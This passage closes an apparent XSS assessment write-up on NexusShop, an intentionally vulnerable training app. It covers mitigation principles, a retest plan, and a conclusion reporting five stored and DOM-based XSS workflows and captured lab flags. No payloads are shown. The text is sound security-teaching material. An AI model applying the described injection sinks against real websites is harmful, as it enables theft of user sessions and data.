**Defense-in-depth distinction:** Input validation constrains expected data; output encoding and safe DOM APIs prevent interpretation as code; sanitization is reserved for fields that intentionally allow formatted HTML. CSP and cookie attributes reduce certain consequences but **do not replace** fixing injection sinks. `encodeURIComponent()` is for safe URL construction, **not** for safely rendering HTML or executable JavaScript.

### Suggested validation sequence

1. Fix and retest all confirmed stored/DOM issues first (Tasks 2–6).
2. Revisit Task 0 to reconstruct its successful payload/C2 trace and Task 1 for a complete reproduction; Task 6 is now confirmed across Level 7 Stages 1–3, but should be regression-tested against cross-origin delivery after remediation.
3. Run each successful historical probe in a dedicated test environment and show it now renders inertly or is rejected.
4. Recheck rendered Markdown previews, alternative profile/review fields, and cross-origin `postMessage` behavior to prevent partial fixes.

---

## 4. Conclusion

NexusShop's educational application exhibited **five confirmed XSS-vulnerable workflows** across stored and DOM-based input sources. The clearest root causes were untrusted profile/review/Markdown data being interpreted as HTML, and URL-fragment data reaching `innerHTML` or an executable link protocol. Multiple filters failed to address all execution contexts; however, some later-stage controls did block the specific probes tested.

**Overall assessment status: Partially complete, with material verified findings.** Five flags are now documented verbatim: four (`0`, `3`, `4`, and `6`) verified against the GitHub repository, plus Level 7 captured directly from the completed `postMessage` challenge. Task 0 is the first exercise and is linked to `0-flag.txt`. Source C2 screenshots and exact final payloads for some other stages remain unavailable; unverified tasks are not marked as solved.

This system is **intentionally vulnerable for educational purposes**, and the demonstrated behavior should not be interpreted as evidence of a weakness in any separate production NexusShop deployment. The central lesson is that XSS is a **data-flow and output-context issue**: fixing one filter or one field does not protect other sources and sinks. Proper remediation consists of safe-by-default rendering, tight trust boundaries, suitable sanitization where required, and stage-by-stage regression testing.

*End of report.*
